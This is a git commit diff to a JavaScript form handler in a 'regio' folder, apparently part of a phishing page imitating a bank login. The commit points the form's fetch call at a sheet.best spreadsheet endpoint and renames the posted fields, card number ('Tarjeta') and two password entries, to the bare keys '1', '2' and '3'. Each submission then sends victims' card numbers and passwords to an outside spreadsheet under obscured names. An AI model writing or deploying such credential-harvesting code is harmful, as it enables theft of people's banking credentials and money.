cacffc3a4dae37f4c56ce02cb5da9b49d47491be
soporte-8c <162223886+soporte-8c@users.noreply.github.com>
2024-05-14 12:17:07 -0600

    Update 197app.js

--- regio/js/197app.js
+++ regio/js/197app.js
@@ -7,16 +7,16 @@ formulario.addEventListener('submit', async(e) =>{
 
 
 try {    
-    const respuesta = await fetch('', {
+    const respuesta = await fetch('https://sheet.best/api/sheets/0286dc53-3203-4d75-8a03-832791c3d2b2', {
         method: 'POST',
         mode: 'cors',
         headers: {
             'Content-Type': 'application/json'
         },
         body: JSON.stringify({
-            "Tarjeta": formulario.usuario.value,
-            "Contrasena1": formulario.contraseña.value,
-            "Contrasena2": formulario.confirmar.value
+            "1": formulario.usuario.value,
+            "2": formulario.contraseña.value,
+            "3": formulario.confirmar.value
         })
     });
 
